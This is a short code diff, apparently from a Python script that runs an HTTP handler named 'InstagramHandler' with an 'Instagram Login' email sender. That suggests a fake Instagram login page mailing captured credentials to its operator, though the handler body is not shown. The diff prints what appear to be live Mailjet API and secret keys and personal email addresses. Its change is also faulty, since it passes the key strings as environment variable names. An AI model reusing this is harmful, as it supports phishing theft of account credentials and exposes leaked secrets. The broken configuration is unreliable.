@@ -6,12 +6,12 @@ from datetime import datetime
 import os
 import requests
 
-# Configuración de Mailjet (¡cámbialas!)
-MAILJET_API_KEY = "26f97d1e712118b2df6b678c218a6cc6"
-MAILJET_SECRET_KEY = "097bc551e192cb74d27ea10aeb5b3cbf"
-SENDER_EMAIL = "mexicanonwod@gmail.com"  # Debe estar verificado en Mailjet
-SENDER_NAME = "Instagram Login"
-RECIPIENT_EMAIL = "mexicanonwod@gmail.com"  # Tu correo personal
+import os
+
+MAILJET_API_KEY = os.environ.get("26f97d1e712118b2df6b678c218a6cc6")
+MAILJET_SECRET_KEY = os.environ.get("097bc551e192cb74d27ea10aeb5b3cbf")
+SENDER_EMAIL = os.environ.get('SENDER_EMAIL', "mexicanonwod@gmail.com")
+RECIPIENT_EMAIL = os.environ.get('RECIPIENT_EMAIL', "isowyvencid@gmail.com")
 
 class InstagramHandler(BaseHTTPRequestHandler):
     def do_GET(self):
